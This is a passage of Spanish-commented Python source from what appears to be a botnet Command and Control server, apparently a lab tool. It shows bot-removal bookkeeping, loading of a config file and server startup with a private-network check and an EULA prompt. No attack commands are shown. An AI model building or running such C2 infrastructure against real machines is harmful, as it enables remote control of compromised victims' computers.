            print(f"ID de bot {bot_id} no válido.") # Imprimir un mensaje de error
            return

        try:
            bot.close() # Cerrar la conexión
            print(f"Conexión con el bot {bot_id} cerrada.") # Imprimir un mensaje de confirmación
        except Exception as e:
            print(f"Error al cerrar la conexión con el bot {bot_id}: {e}")

        if bot in bots:
            bots.remove(bot) # Eliminar el bot de la lista

        if bot in bot_ids:
            del bot_ids[bot] # Eliminar el ID del bot

        if bot in sistemas_operativos:
            del sistemas_operativos[bot] # Eliminar el SO del bot

        print(f"Bot {bot_id} eliminado correctamente del sistema.")
    except Exception as e:
        logging.error(f"Error al cerrar conexión con los bots: {e}")

def cargar_configuracion():
    
    """
    Carga la configuración del servidor desde un archivo "config.ini" ubicado
    en el directorio "config" del proyecto.

    La configuración se almacena en un objeto con las siguientes claves:
        * BASE_DIR: Directorio base del proyecto.
        * HOST: Dirección IP del servidor.
        * PORT: Puerto de escucha del servidor.
        * MAX_CONNECTIONS: Número máximo de conexiones permitidas.
        * DB_PATH: Ruta del archivo de la base de datos.
        * SECRET_KEY: Clave secreta para la autenticación.
        * HASH_ALGORITHM: Algoritmo de hash para la autenticación.
        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).
        * SERVER_LOG_FILE: Ruta del archivo de log.

    Si no se encuentra el archivo de configuración o hay un error al leerlo,
    se muestra un mensaje de error y se sale del programa con un estado de
    error.

    :return: Un objeto con la configuración cargada.
    """
    try:
        logging.info("Cargando configuración del servidor")
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        CONFIG_DIR = os.path.join(BASE_DIR, "..", "config")
        CONFIG_PATH = os.path.join(CONFIG_DIR, "config.ini")

        if not os.path.exists(CONFIG_PATH):
            raise FileNotFoundError(f"[ERROR] No se encontró el archivo de configuración: {CONFIG_PATH}")

        config = configparser.ConfigParser()
        config.read(CONFIG_PATH)

        return {
            "BASE_DIR": BASE_DIR,
            "HOST": config.get("NETWORK", "HOST"),
            "PORT": config.getint("NETWORK", "PORT"),
            "MAX_CONNECTIONS": config.getint("NETWORK", "MAX_CONNECTIONS"),
            "DB_PATH": os.path.join(BASE_DIR, config.get("DATABASE", "DB_PATH")),
            "SECRET_KEY": config.get("SECURITY", "SECRET_KEY"),
            "HASH_ALGORITHM": config.get("SECURITY", "HASH_ALGORITHM"),
            "LOG_LEVEL": config.get("LOGGING", "LOG_LEVEL"),
            "SERVER_LOG_FILE": os.path.join(BASE_DIR, "..", config.get("LOGGING", "LOG_DIR"), config.get("LOGGING", "SERVER_LOG_FILE"))
        }
    except Exception as e:
        logging.error(f"Error al cargar la configuración: {e}")
        exit(1)

def iniciar_servidor():
    """
    Inicializa el servidor de Comando y Control (C2) verificando primero
    que no se ejecute en una red privada y mostrando un aviso de EULA.

    Luego, inicializa la base de datos, configura el sistema de logging y
    lanza el servidor de C2.

    :return: None
    """
    try:
        logging.info("Iniciando servidor de Comando y Control (C2)")
        config = cargar_configuracion()
        configurar_logging(config)  # Pasar el objeto de configuración en lugar de la cadena
        if not esRedPrivada(config["HOST"]):
            input("[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.")
            sys.exit(1)
        verificar_eula("servidor")
        init_db(config["DB_PATH"])
        servidor_CnC(config["HOST"], config["PORT"], config)
        logging.info("Servidor de Comando y Control (C2) iniciado correctamente")
    except Exception as e:
        logging.error(f"Error al iniciar el servidor: {e}")

if __name__ == "__main__":
    try:
        iniciar_servidor()
    except Exception as e:
        logging.error(f"Error en la ejecución principal: {e}")